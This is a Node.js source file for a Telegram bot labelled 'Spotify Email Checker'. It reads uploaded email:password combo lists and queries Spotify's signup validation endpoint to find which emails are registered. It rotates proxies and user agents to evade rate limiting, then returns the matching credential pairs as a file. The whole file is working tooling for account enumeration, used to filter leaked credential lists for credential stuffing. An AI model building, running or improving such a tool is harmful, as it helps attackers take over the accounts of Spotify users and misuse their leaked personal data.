require('dotenv').config();
const fs = require('fs');
const https = require('https');
const fetch = require('node-fetch');
const express = require('express');
const { Telegraf } = require('telegraf');
const { HttpsProxyAgent } = require('https-proxy-agent');

// ⚙️ CONFIGURATION
const CONFIG = {
  API_URL: 'https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email=',
  OUTPUT_FILE: 'Spotify VM.txt',
  SUCCESS_KEYS: [
    'Ese correo electrónico ya está registrado en una cuenta.',
    'That email is already registered to an account',
    'Cette adresse e-mail est déjà associée à un compte.'
  ],
  FAILURE_KEY: '"status":1',
  DELAY: 1500,           // ⏱️ Milliseconds between checks
  BOT_TOKEN: process.env.BOT_TOKEN,
  OWNER_ID: process.env.OWNER_ID ? parseInt(process.env.OWNER_ID) : null
};

const UA_LIST = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
];
const randomUA = () => UA_LIST[Math.floor(Math.random() * UA_LIST.length)];

// 📊 LIVE STATS
let isRunning = false;
let liveCount = 0;
let deadCount = 0;
let unknownCount = 0;

const isOwner = (id) => CONFIG.OWNER_ID === null || id === CONFIG.OWNER_ID;

function loadProxies() {
  if (!fs.existsSync('proxies.txt')) return [];
  return fs.readFileSync('proxies.txt', 'utf8')
    .split(/\r?\n/).map(l => l.trim()).filter(l => l);
}

function getProxy(proxyList) {
  if (!proxyList.length) return undefined;
  return proxyList[Math.floor(Math.random() * proxyList.length)];
}

async function checkEmail(email, proxy) {
  const url = `${CONFIG.API_URL}${encodeURIComponent(email)}`;
  const options = {
    headers: {
      'User-Agent': randomUA(),
      'Accept': '*/*',
      'Pragma': 'no-cache'
    },
    timeout: 15000,
    rejectUnauthorized: true
  };
  if (proxy) options.agent = new HttpsProxyAgent(proxy);

  return new Promise((resolve) => {
    const req = https.get(url, options, (res) => {
      let body = '';
      res.on('data', c => body += c);
      res.on('end', () => {
        for (const key of CONFIG.SUCCESS_KEYS) {
          if (body.includes(key)) return resolve('LIVE');
        }
        if (body.includes(CONFIG.FAILURE_KEY)) return resolve('DEAD');
        resolve('UNKNOWN');
      });
    });
    req.on('error', () => resolve('UNKNOWN'));
    req.end();
  });
}

function saveLive(email, pass) {
  fs.appendFileSync(CONFIG.OUTPUT_FILE, `${email}:${pass || ''}\n`, 'utf8');
}

function panel() {
  return `
╔════════════════════════════════╗
║        🎵 SPOTIFY CHECKER       ║
╠════════════════════════════════╣
║   ✅  𝗟𝗜𝗩𝗘:   ${String(liveCount).padEnd(4)}              ║
║   ❌  𝗗𝗘𝗔𝗗:   ${String(deadCount).padEnd(4)}              ║
║   ⚠️  𝗨𝗡𝗞𝗡𝗢𝗪𝗡: ${String(unknownCount).padEnd(4)}              ║
╚════════════════════════════════╝
`;
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// 🤖 BOT SETUP
const bot = new Telegraf(CONFIG.BOT_TOKEN);
const app = express();
const PORT = process.env.PORT || 10000;

bot.use((ctx, next) => {
  if (!isOwner(ctx.from.id)) return ctx.reply('❌ Unauthorized');
  return next();
});

// ─── COMMANDS ───────────────────────────────────────────────────────
bot.command('start', ctx => {
  ctx.replyWithMarkdown(`
🎵 *Spotify Email Checker* — Quiet Mode

*Commands:*
/upload — Send email list (.txt)
/proxies — Send proxy list (optional)
/startcheck — Begin checking
/stop — Stop immediately
/panel — Show current counts
/clear — Reset counts & file

✅ No spam — results sent as file when done
  `);
});

bot.command('panel', ctx => ctx.reply(panel()));
bot.command('stop', ctx => { isRunning = false; ctx.reply('🛑 Stopped.\n' + panel()); });

bot.command('upload', ctx => ctx.reply('📄 Send your email list — one email:password per line'));
bot.command('proxies', ctx => ctx.reply('🕵️ Send proxy list — one per line (optional)'));

bot.command('clear', ctx => {
  liveCount = deadCount = unknownCount = 0;
  if (fs.existsSync(CONFIG.OUTPUT_FILE)) fs.unlinkSync(CONFIG.OUTPUT_FILE);
  ctx.reply('🔄 Cleared.\n' + panel());
});

bot.command('startcheck', async ctx => {
  if (isRunning) return ctx.reply('⚠️ Already running — /stop first');
  if (!fs.existsSync('mail.txt')) return ctx.reply('⚠️ Upload list with /upload first');

  // Reset everything
  liveCount = deadCount = unknownCount = 0;
  if (fs.existsSync(CONFIG.OUTPUT_FILE)) fs.unlinkSync(CONFIG.OUTPUT_FILE);
  isRunning = true;

  const proxies = loadProxies();
  const entries = fs.readFileSync('mail.txt', 'utf8')
    .split(/\r?\n/).map(l => l.trim()).filter(l => l);

  const msg = await ctx.reply(`🚀 Started — ${entries.length} emails\n${panel()}`);

  for (let i = 0; i < entries.length && isRunning; i++) {
    const [email, pass = ''] = entries[i].split(':');
    if (!email) continue;

    const result = await checkEmail(email, getProxy(proxies));

    if (result === 'LIVE') {
      liveCount++;
      saveLive(email, pass);
    } else if (result === 'DEAD') {
      deadCount++;
    } else {
      unknownCount++;
    }

    // Update panel every 20 emails — no individual messages
    if ((i + 1) % 20 === 0 || i === entries.length - 1) {
      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null,
        `🚀 Progress: ${i + 1}/${entries.length}\n${panel()}`
      ).catch(() => ctx.reply(panel())); // fallback if edit fails
    }

    await delay(CONFIG.DELAY);
  }

  isRunning = false;

  // Final summary + send file
  await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null,
    `🏁 FINISHED!\nChecked: ${entries.length}\n${panel()}`
  ).catch(() => {});

  if (liveCount > 0 && fs.existsSync(CONFIG.OUTPUT_FILE)) {
    await ctx.replyWithDocument({
      source: CONFIG.OUTPUT_FILE,
      filename: `LIVE_Results_${Date.now()}.txt`
    });
  } else {
    await ctx.reply('✅ Done — No LIVE emails found.');
  }
});

// ─── FILE UPLOAD ────────────────────────────────────────────────────
bot.on('document', async ctx => {
  const doc = ctx.message.document;
  try {
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const text = await (await fetch(fileLink.href)).text();
    const lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l);

    if (doc.file_name?.toLowerCase().includes('prox')) {
      fs.writeFileSync('proxies.txt', lines.join('\n'));
      ctx.reply(`✅ ${lines.length} proxies saved`);
    } else {
      fs.writeFileSync('mail.txt', lines.join('\n'));
      ctx.reply(`✅ ${lines.length} emails saved — ready`);
    }
  } catch {
    ctx.reply('❌ Failed to read file');
  }
});

// ─── HEALTH CHECK ──────────────────────────────────────────────────
app.get('/', (_, res) => res.send('🎵 Bot Online'));
app.get('/health', (_, res) => res.json({ ok: true, running: isRunning }));
app.listen(PORT, '0.0.0.0', () => console.log(`🌐 Port ${PORT}`));

// ─── START BOT ─────────────────────────────────────────────────────
setTimeout(() => {
  bot.launch({ polling: true })
    .then(() => console.log('🤖 Bot Online'))
    .catch(err => {
      console.error('❌ Bot error:', err.message);
      process.exit(1);
    });
}, 3000);

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
